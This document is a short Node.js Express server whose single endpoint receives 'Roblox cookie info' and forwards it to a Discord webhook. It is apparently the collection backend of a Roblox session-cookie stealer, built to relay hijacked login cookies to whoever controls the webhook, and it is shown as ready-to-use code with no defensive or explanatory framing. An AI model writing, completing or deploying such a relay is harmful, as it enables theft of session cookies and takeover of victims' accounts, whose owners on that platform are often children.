const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;
const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE";

// Middleware to parse JSON request body
app.use(bodyParser.json());

// Route to handle logging
app.post('/log', (req, res) => {
    const { cookieInfo } = req.body; // Assuming you send the cookie info in the request body

    // Construct message for Discord webhook
    const message = `Roblox cookie info: ${cookieInfo}`;

    // Send message to Discord webhook
    sendToDiscord(message);

    res.status(200).send('Logged successfully.');
});

// Function to send message to Discord webhook
function sendToDiscord(message) {
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: message })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to send message to Discord');
        }
        console.log('Message sent to Discord successfully');
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
